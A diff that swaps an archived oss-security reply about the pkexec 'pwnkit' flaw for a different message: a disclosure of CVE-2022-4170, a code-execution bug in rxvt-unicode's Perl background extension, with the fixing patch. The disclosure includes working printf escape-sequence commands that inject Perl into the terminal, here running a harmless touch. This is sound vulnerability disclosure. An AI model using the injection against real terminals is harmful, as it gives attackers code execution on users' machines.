@@ -1,39 +1,58 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/27/2
-Message-ID: <CAL6HQvEU_KcXFrvgLoP1woAyV6U-8onZBJ=4vs-FE0gxLCrvYw@mail.gmail.com>
-Date: Thu, 27 Jan 2022 13:45:33 +0100
-From: Kai Lüke <kai@...volk.io>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/12/05/1
+Message-ID: <CAP9KPhDh6PJu-0mD12wYUraf1Ya1MSUPwz1PsPO5omi39-OYLw@mail.gmail.com>
+Date: Mon, 5 Dec 2022 22:22:33 +1100
+From: David Leadbeater <dgl@....cx>
 To: oss-security@...ts.openwall.com
-Subject: Re: pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
+Subject: CVE-2022-4170: rxvt-unicode code execution via background OSC
 Content-Type: text/plain; charset=utf-8
 
-> Dominik Czarnota:
-> And many other binaries also do things incorrectly
+I've discovered rxvt-unicode 9.25 and 9.26 are vulnerable to remote
+code execution, in the Perl background extension, when an attacker can
+control the data written to the user's terminal and certain options
+are set.
 
-The setuid binary polkit-agent-helper-1 has checks in place for argc
-in the usual code paths but when it's not executed with euid 0 (i.e.,
-it's not setuid), there is an argv[0] deref through printf which
-luckily handles gracefully and prints "(null)" instead:
-  polkit-agent-helper-1: needs to be setuid root
-  PAM_ERROR_MSG Incorrect permissions on (null) (needs to be setuid root)
+The "background" extension is automatically loaded if certain X
+resources are set such as 'transparent' (see the full list at the top
+of src/perl/background[1]). So it is possible to be using this
+extension without realising it.
 
-I wonder however, if the amount of setuid binaries couldn't be
-reduced, in this case by offloading the PAM auth check to the polkit
-daemon again (which could verify the client's programs uid through the
-Unix Domain Socket).
+This is accidentally fixed on version 9.30, and I haven't confirmed
+9.29, it appears to not be exploitable, but only due to another (not
+security) bug. The actual bug which makes this not vulnerable on 9.30
+is simply a wrong number in "on_osc_seq".
 
-An alternative to pkexec that is not setuid but also uses polkit auth
-is systemd-run (here is an attempt at mimicking the sudo UX:
-https://gist.github.com/pothos/73dd4f7694acc3b6bbed614438f6e2b1).
+For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix is:
 
+ sub q0 {
+-   (my $str = shift) =~ s/\x00//g; # make sure there really aren't
+any embedded NULs
+-   "q\x00$str\x00"
++   "qq\x00\Q$_[0]\E\x00"
+ }
 
--- 
-Kinvolk GmbH | Adalbertstr.6a, 10999 Berlin | tel: +491755589364
+Isn't Perl quoting fun? Paranoid people may wish to remove the entire
+"on_osc_seq" subroutine to avoid passing any potentially untrusted
+input anywhere near eval (this feature is deprecated and the
+maintainer did mention they are considering what to do longer term).
 
-Geschäftsführer/Directors: Benjamin Owen Orndorff
+It doesn't make sense to withhold an exploit for this; the fix gives a
+pretty good idea where to look and this isn't vulnerable in the latest
+version.
 
-Registergericht/Court of registration: Amtsgericht Charlottenburg
+$ urxvt -transparent
 
-Registernummer/Registration number: HRB 171414 B
+Inside that running terminal:
 
-Ust-ID-Nummer/VAT ID number: DE302207000
+# Make tint be "\\", which means the ending \x00 is quoted under our control
+$ printf '\e]705;\\\a'
+# Make the second q0 end the quoted q-string and then be valid perl
+under our control
+$ printf '\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\a'
+
+This has been assigned CVE-2022-4170.
+
+David
+
+[1]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?revision=1.109&view=markup
+[2]: http://cvs.schmorp.de/rxvt-unicode/src/perl/background?r1=1.105&r2=1.109
